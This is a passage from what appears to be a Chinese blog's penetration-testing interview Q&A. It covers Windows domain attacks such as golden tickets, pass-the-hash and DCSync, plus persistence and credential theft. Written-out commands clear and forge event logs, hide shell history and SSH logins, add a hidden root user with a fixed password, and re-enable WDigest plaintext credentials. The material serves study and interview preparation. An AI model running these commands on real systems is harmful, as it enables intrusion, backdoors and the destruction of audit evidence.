start="19"><li>如何向服务器写入webshell？</li></ol><p>各种上传漏洞<br>mysql具有写入权限，用sql语句写入shell<br>http put方法</p><ol start="20"><li>ddos如何防护</li></ol><p>(1) SYN Cookie&#x2F;SYN proxy, safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个cookie，并统计每个IP地址的访问频率。如果在短时间内收到大量来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被抛弃。（适用于单主机的DDOS）<br>(2) 过滤不必要的服务和端口, 可以使用Inexpress、Express、Forwarding等工具来过滤不必要的服务和端口，即在路由器上过滤假IP。<br>(3) 异常流量的清洗过滤：通过DDOS硬件防火墙对异常流量的清洗过滤，通过数据包的规则过滤、数据流指纹检测过滤、及数据包内容定制过滤等顶尖技术能准确判断外来访问流量是否正常，进一步将异常流量禁止过滤。<br>(4) 分布式集群防御：这是目前网络安全界防御大规模DDOS攻击的最有效办法。分布式集群防御的特点是在每个节点服务器配置多个IP地址（负载均衡），并且每个节点能承受不低于10G的DDOS攻击，如一个节点受攻击无法提供服务，系统将会根据优先级设置自动切换另一个节点，并将攻击者的数据包全部返回发送点，使攻击源成为瘫痪状态，从更为深度的安全防护角度去影响企业的安全执行决策。<br>(5) 高防智能DNS解析：高智能DNS解析系统与DDOS防御系统的完美结合，为企业提供对抗新兴安全威胁的超级检测功能。它颠覆了传统一个域名对应一个镜像的做法，智能根据用户的上网路线将DNS解析请求解析到用户所属网络的服务器。同时智能DNS解析系统还有宕机检测功能，随时可将瘫痪的服务器IP智能更换成正常服务器IP，为企业的网络保持一个永不宕机的服务状态。<br>(6) CDN。缺点是一旦被人知道源服务器的IP，就可绕过。</p><ol start="21"><li>有没有抓过包，会不会写wireshark过滤规则？</li></ol><p>有。wireshark和burpsuite<br>会写。wireshark过滤规则：</p><p>过滤IP：<br>过滤源IP地址： <code>ip.src==1.1.1.1</code><br>过滤目的IP地址： <code>ip.dst==1.1.1.1</code></p><p>过滤端口：<br>过滤80端口： <code>tcp.port==80</code><br>过滤源端口： <code>tcp.srcport==80</code><br>过滤目的端口： <code>tcp.dstport==80</code></p><p>协议过滤：<br>直接输入协议名即可，如http协议：<br><code>http</code></p><p>http模式过滤：<br>过滤get&#x2F;post包：<br><code>http.request.method==&quot;GET/POST&quot;</code></p><ol start="22"><li>清理日志要清理哪些？</li></ol><p>Linux清理日志见问题2<br>Windows清理日志：<br>(1) 命令行一键清除Windows事件日志：<br><code>PowerShell -Command &quot;&amp; &#123;clear-Eventlog -Log Application,System,Security&#125;&quot;</code><br><code>Get-WinEvent -ListLog Application,Setup,Security -Force | %&#123;Wevtutil.exe cl $_.Logname&#125;</code></p><p>(2) wevtutil.exe<br>操作系统默认包含，支持系统：win7及以上。<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>wevtutil.exe gli Application</code></p><p>查看指定类别的日志内容：<br><code>wevtutil qe /f:text Application</code></p><p>删除该类日志所有内容（单条内容删除暂不支持）：<br><code>wevtutil cl Application</code></p><p>(3) NSA DanderSpiritz<br><a href="https://3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95">DanderSpritz</a>是NSA的一款界面化的远控工具<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>eventlogquery -log Application</code></p><p>查看指定类别的日志内容<br><code>eventlogfilter -log Application -num 10</code></p><p>删除该类日志所有内容<br><code>eventlogclear -log Application</code></p><p>删除单条内容<br><code>eventlogedit -log Application -record 1</code></p><p>注：<br>record序号可通过eventlogfilter获得</p><p>(4) Windows日志伪造，使用eventcreate这个命令行工具来伪造日志或使用自定义的大量垃圾信息覆盖现有日志。<br><code>eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</code></p><ol start="23"><li>查看当前端口连接的命令有哪些？ <code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点<br><code>netstat -an</code></li></ol><p>windows:<br>PowerShell: <code>Get-NetTCPConnection -State Listen</code></p><p>On Linux &#x2F; macOS:<br><code>sudo lsof -i -P -n | grep LISTEN</code></p><ol start="24"><li>判断域控的几种方式</li></ol><p>(1) 查看系统信息：在Windows系统中，可以通过以下命令查看系统信息：<br><code>systeminfo</code><br>如果是域控，则会显示域名和域控制器的名称。<br>(2) 查看域成员：可以通过以下命令查看域成员：<br><code>net group /domain</code><br>如果系统是域控，则会显示域中所有成员的信息。<br>(3) 查看域控制器：可以通过以下命令查看域控制器：<br><code>nltest /dclist:域名</code><br>该命令将显示域中的所有域控制器。<br>(4) 查看DNS记录：可以通过以下命令查看DNS记录：<br><code>nslookup -type=SRV _ldap._tcp.域名</code><br>该命令将显示域控制器的SRV记录。<br>(5) 查看计算机的角色：在Windows Server中，可以通过Server Manager查看一个计算机的角色。如果计算机的角色是“Active Directory 域服务”，则它是域控制器。</p><ol start="25"><li><p>工作组横向<br>(1) 通过at&amp;schtasks进行明文传递<br>说明：at&amp;schtasks 都是 windows 上创建计划任务的命令，只是针对的版本不同，at是win2008及以下；<br>(2) atexec进行明文与HASH传递<br>(3) SMB服务利用<br>(4) WMI服务利用<br>(5) PTH横向传递攻击<br>(6) PTK横向传递攻击<br>(7) RDP传递攻击<br><a href="https://www.wangan.com/p/11v71d8e5253fc5f#%E4%B8%80%E3%80%81%E9%80%9A%E8%BF%87at&schtasks%E8%BF%9B%E8%A1%8C%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92">内网横向移动常用方法及工具总结</a></p></li><li><p>域内横向</p></li></ol><p>(1) LM Hash 和 NTLM Hash<br>(2) PTH&amp;PTT&amp;PTK<br>(3) DCSync<br>(4) Zerologon 域提权漏洞<br>(5) 从NTDS.dit获取域散列值<br><a href="https://www.shawroot.cc/2204.html">域内横向移动学习笔记</a><br><a href="https://github.com/SewellDinG/Pentest-Notes/blob/master/%E7%AC%AC5%E7%AB%A0.%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1.md">域内横向移动分析及防御</a></p><ol start="27"><li>白银票据黄金票据</li></ol><p>白银票据是指伪造的服务票据（Service Ticket，ST），它可以授权攻击者访问指定服务器上的指定服务。白银票据的生成需要以下条件：<br>1.域名称<br>2.域的SID值<br>3.域中的Server服务器账户的NTLM-Hash<br>4.伪造的用户名，可以是任意用户名.<br>5.目标服务器上面的kerberos服务</p><p>白银票据的生成过程如下：<br>通过mimikatz生成银票。</p><p>白银票据的使用过程如下：<br>使用mimikatz执行如下命令导入Silver Ticket</p><p>黄金票据是指伪造的TGT票据，它可以授权攻击者访问域内所有服务。黄金票据的生成需要以下条件：<br>1、域名称<br>2、域的SID值<br>3、域的KRBTGT账户密码HASH<br>4、伪造用户名，可以是任意的</p><p>黄金票据的生成过程如下：<br>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>黄金票据的使用过程如下：<br>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><p>黄金票据防御<br>1、限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。<br>2、禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</p><p>关于黄金票据和白银票据的一些区别:<br>1、访问权限不同<br>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>Silver Ticket: 伪造TGS,只能访问指定的服务</p><p>2、加密方式不同<br>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</p><p>3、认证流程不同<br>Golden Ticket 的利用过程需要访问域控(KDC)<br>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">浅析黄金票据与白银票据</a></p><ol start="28"><li>判断是否在域内</li></ol><p>1、 查看当前网卡和IP信息<br>使用命令 <code>ipconfig /all</code><br>在Windows IP 配置(Windows IP Configuration)下的主DNS后缀(Primary DNS Suffix)处：<br>如果为空，说明不在域内；<br>如果显示域名，说明在域内。</p><p>2、 查看操作系统详细信息<br>使用命令 <code>systeminfo</code><br>在域(Domain)处，如果：<br>显示 工作组(WORKGROUP)，说明不在域内。<br>显示 域名，说明在域内。</p><p>3、 查看当前登录域及域用户<br>使用命令 <code>net config workstation</code><br>在工作站域(Workstation Domain):<br>显示WORKGROUP，说明不在域内。<br>显示域名，说明在域内。而且多一行“工作站域DNS名称”。</p><p>4、 查看域内时间<br>使用命令 <code>net time /domain</code><br>通过执行以上命令后，会出现三种情况：<br>(1) 当前是工作组环境。会显示“找不到域 WORKGROUP 的域控制器。”<br>(2) 存在域，当前用户不是域用户。会显示“发生系统错误5。 拒绝访问。”<br>(3) 存在域，当前用户是域用户。会显示“DC1.xx.xx 的当前时间是 YY&#x2F;MM&#x2F;DD HH:MM:SS  命令成功完成”</p><ol start="29"><li>hash传递原理</li></ol><p>hash传递原理(Pass-The-Hash):<br>哈希传递攻击是基于NTLM认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用NTLM认证的一种缺陷，利用用户的密码哈希值来进行NTLM认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。</p><ol start="30"><li>权限维持</li></ol><p>Windows权限维持：<br>(1) 辅助功能镜像劫持。比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序<br>(2) 启动项或服务后门。<br>(3) 系统计划任务后门。<br>(4) DLL劫持<br>(5) Winlogon用户登录初始化<br>(6) Logon Scripts 后门<br>(7) 文件关联<br>(8) Bitsadmin<br>(9) 进程注入<br>(10) 屏幕保护程序<br>(11) WMI构造无文件后门<br>(12) 影子用户<br><a href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p><p>Linux权限维持：<br>1、隐藏文件：创建隐藏文件的命令 <code>touch .test.txt</code> ，在文件名前加一个点即可创造隐藏文件。<br>2、隐藏文件时间戳：Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。<br>3、隐藏权限：在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用 <code>ls -l</code> 是查看不出来的，从而达到隐藏权限的目的。<br>4、隐藏历史操作命令：(1) 只针对自己的工作关闭历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关闭历史功能命令 [space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br><span class="line">重启历史功能命令 [space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>(2) 从历史记录中删除指定命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除历史记录的命令 history | grep &quot;keyword&quot;</span><br><span class="line">输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</span><br><span class="line">history -d [num]</span><br><span class="line">只保留前150行的命令 sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure><p>5、隐藏远程SSH登录记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">身登录系统，不会被w、who、last等指令检测到。</span><br><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br><span class="line">不记录ssh公钥在本地.ssh目录中</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i</span><br></pre></td></tr></table></figure><p>6、端口复用<br>通过端口复用来达到隐藏端口的目的<br>(1) 通过SSLH在同一端口上共享SSH与HTTPS<br>(2) 利用IPTables进行端口复用</p><p>7、进程隐藏<br>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。<br>(1) libprocesshider<br>(2) 进程注入工具linux-inject</p><p>8、一句话添加用户和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p>9、SUID Shell<br>Suid shell是一种可用于以拥有者权限运行的shell。</p><p>10、SSH公私钥免密登录<br>在客户端上生成一对公私钥，然后把公钥放到服务器上（ <code>~/.ssh/authorized_keys</code> ），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>11、软连接<br>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。</p><p>12、SSH Wrapper<br>从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>13、strace后门<br>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><p>14、crontab反弹shell<br>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>15、openssh后门<br>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><p>16、PAM后门<br>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。</p><p>17、rootkit后门<br>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。<br><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Linux权限维持–后门篇</a></p><ol start="31"><li>横向移动的各种姿势和原理</li></ol><p>见问题25，26</p><ol start="32"><li>凭证获取(姿势&#x2F;常用&#x2F;原理&#x2F;对抗)</li></ol><p>Windows凭证保护机制及bypass：<br>1、LSA保护<br>自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。</p><p>bypass：<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass LSA Protection，读取到用户哈希<br>(2) mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功bypass LSA保护</p><p>2、Credential Guard(虚拟化保护)<br>在Windows 10和Windows Server 2016中，Microsoft启用Credential Guard（凭据防护），使用基于虚拟化技术来保护和隔离lsass进程，以保护凭证。启用Credential Guard后，lsass包含2个进程：正常LSA进程和隔离LSA进程（在VSM中运行）</p><p>bypass:<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass Credential Guard，读取到全部的用户哈希<br>(2) SSP在用户登录时被调用，并接收该用户的凭据。在系统启动时SSP会被加载到进程lsass.exe中。</p><p>3、kb2871997补丁<br>kb2871997主要用来防止pth攻击，限制了两个sid（kb2871997会删除除了*wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用）</p><p>bypass:<br>(1) 修改注册表实现，需要重启：<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>(2) 锁屏实现：<br><code>rundll32.exe user32.dll LockWorkStation</code><br>(3) 使用截屏、键盘记录等后渗透功能，一般都要对应用户的空间下操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//cs</span><br><span class="line">desktop [explorer pid] x86|x64 low |higt</span><br><span class="line">//msf</span><br><span class="line">migrate [explorer pid]</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/220991">Windows凭证机制浅析</a></p><ol start="33"><li>如何对抗杀软加后门用户</li></ol><p>绕过敏感操作方式：白加黑。利用Windows系统的一些白文件去执行相应的敏感操作。<br>绕过流量特征方式：<br>(1) TCP分段。指的是数据包在传输过程中切分后以小段传输(效果不错，但网络不好容易断)<br>(2) 内容加密。针对传输内容加密混淆，比如执行命令的字符串<br>(3) 使用合法证书。<br><a href="https://0range-x.github.io/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/">浅析杀软</a></p><ol start="34"><li>chrome dump密码的原理，如果让你写个工具，思路是什么？（或者别人工具的实现原理）</li></ol><p>chrome dump密码的原理：<br>正常用户访问网站时，可选择使用Chrome浏览器保存登录的用户密码，用于下次登录的时候Chrome自动填写登录密码<br>Chrome中保存的密码先被二次加密(通过Windows API CryptProtectData()实现)，然后被保存在SQLite数据库文件中，位置如下：<br><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code><br>解密需要获得三部分内容：<br>(1) 加密密钥(即Master Key文件)，位于%appdata%\Microsoft\Protect下对应sid文件夹下的文件<br>(2) 数据库文件Login Data<br>(3) 用户明文的密码，用于解密加密密钥</p><p>简单的方式(适用于部分非直接登录的站点)：<br>直接登录对应的网站，通过F12修改密码框字段属性为 <code>value type = &quot;text&quot;</code><br>即可显示密码</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">导出Chrome浏览器中保存的密码</a><br><a href="https://www.huwoo.net/2020/post-4150.html">离线导出Chrome浏览器中保存的密码</a><br><a href="https://yinhaoqin.com/%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81/">浏览器导出密码</a><br><a href="https://cloud.tencent.com/developer/article/2204689">最全的内网凭据密码收集方法和技巧总结</a></p><ol start="35"><li>PTH哈希传递</li></ol><p>见问题29</p><ol start="36"><li>DCsync原理，DCsync是哪个协议？</li></ol><p>当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步，而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC &#x2F; DCE&#x2F;RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI(这个在后面抓包可以看到)。在不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p><p>DCsync原理：利用DCSync导出域内用户的哈希值，本质上就是利用DRS(Directory Replication Service)协议通过 IDL_DRSGetNCChanges 从域控制器复制用户哈希凭据，以便进一步进行利用。<br>对拥有“复制目录更改（DS-Replication-Get-Changes）、全部复制目录更改 (DS-Replication-Get-Changes-All )、在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）”三条DACL的域用户，向域控发出数据同步请求，从而去dump域内用户hash。<br>默认本地管理员，域管理员或企业管理员以及域控制器计算机账户得成员默认具有上述权限。<br>注意，默认情况下，DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。</p><p>DCsync是：DRS(Directory Replication Service)协议。<br><a href="https://tttang.com/archive/1634/">DCSync 技术的攻击和检测</a><br><a href="https://www.secpulse.com/archives/186924.html">基于AD Event日志识别DCSync攻击</a></p><ol start="37"><li>有台Windows域内机器，如何打域控？</li></ol><p>Windows攻击域控的方式：<br>1、高权限读取本地密码(procdump+mimikatz绕过杀软)<br>2、SYSVOL组策略获取密码<br>3、Kerberoasting暴力破解密码<br>4、内网协议NTLM之内网大杀器CVE-20191040漏洞<br>5、CVE-2020-1472-ZeroLogon<br>6、MS14-068漏洞进行提权<br>7、窃取域管理员令牌<br>8、进程迁移</p><p><a href="https://blog.csdn.net/qq_53742230/article/details/126082408">Windows 内网渗透之攻击域控</a></p><ol start="38"><li>webshell 提权（低权限到高权限）</li></ol><p>见问题2</p><ol start="39"><li>已经拿到webshell，说说你的内网思路</li></ol><p>拿到webshell，内网思路：<br>探测系统信息，提权，针对Windows想办法开启远程桌面连接，针对Linux想办法使用反弹shell来本地连接。<br>(1) 探测系统信息：whoami(查看当前权限)，netuser(查看用户&#x2F;组)，systeminfo(查看系统补丁修复情况)等常见命令<br><a href="https://cloud.tencent.com/developer/article/1036438">内网渗透测试思路（二）</a></p><ol start="40"><li>不允许扫描，如何横向</li></ol><p>总体思路就是两种：要么不扫描，要么扫描不被发现。<br>如果不扫描，那么就使用无扫描渗透测试工具；侧信道攻击；还有社工和物理渗透。<br>如果扫描不被发现，就需要进行隐藏：使用应用层代理工具，比如SSH隧道；端口转发和端口隧道；DNS隧道；数据编码和隐蔽通信。</p><p>(1) 无扫描渗透测试工具： 一些专门的渗透测试工具允许执行渗透测试而不触发传统的扫描检测。这些工具可能使用更智能的技术，以避免被IDS&#x2F;IPS（入侵检测系统&#x2F;入侵防御系统）检测到，从而进行横向移动。例如，Cobalt Strike 和Metasploit Beacon。<br>(2) 应用层代理：使用应用层代理工具，如SSH隧道或代理工具，可通过目标网络进行横向移动，而不会触发传统扫描检测。这些工具可以将流量伪装成合法的应用层通信，以避免被检测到。<br>(3) 端口转发和端口隧道：使用工具如 <code>ssh -L</code> 或 <code>ssh -R</code> ，可以在目标系统之间建立端口转发或反向隧道，从而使流量通过建立已建立的连接进行传输，而不触发扫描检测。<br>(4) DNS隧道：使用DNS隧道工具，可以通过DNS请求和响应来传输数据，这通常不会被视为扫描活动。工具如Dnscat2或lodine可用于此目的。<br>(5) 数据编码和隐蔽通信：将数据编码为看似正常通信的形式，例如使用Base64编码或其它编码技术。可以在网络上流动而不引起警觉。<br>(6) 侧信道攻击：利用目标系统的侧信道信息，如CPU利用率、电源消耗等，来执行攻击并获取信息，而不触发扫描检测。<br>(7) 社交工程和物理渗透：利用社交工程技巧或物理访问，可以获取目标系统的凭据或物理访问权限，从而进行横向移动。</p><p>侧信道攻击是一种安全漏洞利用技术，它不是通过直接攻击系统的计算能力或漏洞来获取信息，而是通过观察目标系统在执行某些操作时泄露的辅助信息来获取敏感数据。</p><ol start="41"><li>存在杀软，不允许exe落地，怎么办</li></ol><p>1、使用无文件攻击技术：无文件攻击技术不需要将可执行文件写入磁盘，而是利用操作系统和应用程序的功能来执行恶意代码。这种方法可以绕过杀软的检测。例如，可以使用PowerShell或JavaScript来运行脚本，而不需要生成可执行文件。<a href="https://zhuanlan.zhihu.com/p/65152928">无文件攻击的各种姿势</a>, <a href="https://www.freebuf.com/articles/system/263960.html">常见的windows下无文件落地攻击手法</a><br>2、使用已知合法工具：利用目标系统上已经存在的合法工具来执行渗透测试任务。这些工具通常不会被杀软检测为恶意软件。例如，使用Windows内置工具，如WMIC或Powershell，来执行命令或脚本。<br>3、编写自定义脚本：编写自定义脚本或小型程序，以执行所需的任务。这些脚本可以使用编程语言如python或ruby编写，然后在目标系统上执行，而无需生成可执行文件。<br>4、使用反射型DLL注入：反射型DLL注入是一种技术，允许将代码注入到现有进程的内存中，而不会在磁盘上生成可执行文件。这可以通过工具如Reflective DLL Injection实现。<br>5、使用远程命令执行：利用远程命令执行功能，例如SSH、Powershell Remoting或Windows远程管理服务，以在目标系统上执行命令和脚本，而不需要将文件传输到目标系统上。</p><ol start="42"><li>常用的提权姿势</li></ol><p>见问题2</p><ol start="43"><li>内网代理（详细问了frp）</li></ol><p>frp是一个国人开发的非常易用的内网穿透工具，可以借助具有公网IP的服务器，建立从公网到内网的通道。</p><p>frp使用server&#x2F;client的模式。一般来说，frps (server)运行在具有公网ip的服务器上，而frpc (client)运行在内网的服务器上。frpc连接到frps后，公网用户可以访问frps的ip与特定端口，访问对应的frpc。因此，抛开网络环境，使用frp最基础的条件就是，user与client都可以主动通过ip连接server。</p><p>FRP工作原理介绍<br>1、首先启动frpc，frpc启动后会向frps注册，也就是内网WEB服务器会向VPS请求注册。<br>2、客户端请求frps，也就是当我们的攻击机去访问frps。<br>3、frps告知frpc有新请求，需要建立连接，也就是VPS告知内网WEB服务器，需要建立连接。<br>4、frps收到frpc的请求，建立新的连接，也就是VPS接收到了内网WEB服务器的请求，建立了新的连接。<br>5、frps吧frpc和攻击机的流量互相转发，将frps服务器当成流量中转站，也就是VPS将攻击机的流量转发给内网WEB服务器，把内网WEB服务器的流量转发给攻击机。<br><a href="https://shaoyecheng.com/uncategorized/2021-05-28-%E4%BD%BF%E7%94%A8frp%E4%B8%BA%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91.html">用frp为内网服务器代理上网</a><br><a href="https://zhuanlan.zhihu.com/p/403361038">内网渗透之FRP代理工具详解</a></p><ol start="44"><li><p>内网如何反弹shell，反弹的shell流量如何屏蔽</p></li><li><p>除了TCP&#x2F;IP协议，如何将内网数据传递出来（内网环境有着严格防御与审查）</p></li><li><p>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网进行其它探测？</p></li><li><p>主机疑似遭到入侵，要看哪里的日志？</p></li><li><p>DDOS有哪些？CC攻击是什么，区别是什么，什么协议</p></li><li><p>land攻击</p></li><li><p>绕过waf常用方法</p></li><li><p>信息收集都收集哪些信息</p></li><li><p>获取shell之后，你是怎么提权的？</p></li><li><p>进入到内网之后，怎么去维持权限？</p></li><li><p>讲一下黄金票据</p></li><li><p>讲一下APP渗透</p></li><li><p>如果抓不到包，是因为什么</p></li><li><p>了解APT</p></li><li><p>怎么测内网，怎么访问敏感文件</p></li><li><p>写shell需要什么权限吗？你怎么判断存在写入权限？如果没有写入权限，还能有什么办法吗？</p></li><li><p>怎么获得绝对路径呢？没有报错呢？不能读取文件呢？</p></li><li><p>怎么找到域控机</p></li><li><p>webshell你会利用哪些办法来绕过？</p></li><li><p>不用工具的前提下，如何搜集子域名？</p></li><li><p>渗透测试过程中如何信息收集，说一下渗透测试信息收集的办法？</p></li><li><p>在渗透过程中常用的编码有哪些？</p></li><li><p>渗透测试过程中如何判断对方操作系统是什么系统？</p></li><li><p>你是怎么知道对方网站使用了哪些常用cms系统搭建的（指纹信息是什么）</p></li><li><p>如何寻找网址物理路径？</p></li><li><p>如何创建一个用户并且提权</p></li><li><p>谷歌排行第一的CMS有1000个旁站，问怎么入侵</p></li><li><p>使用谷歌语法查询指定域名的子域名，并且搜索他的后台登录</p></li><li><p>对没有挂到dns上的网站如何进行入侵？</p></li><li><p>端口扫描时，都关注哪些端口，分别代表什么？</p></li><li><p>jsonp安全攻防技术，怎么写jsonp的攻击页面？</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;了解系统，才能更好攻击与防御。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="系统" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之自身方面篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-10T08:29:08.534Z</updated>
    
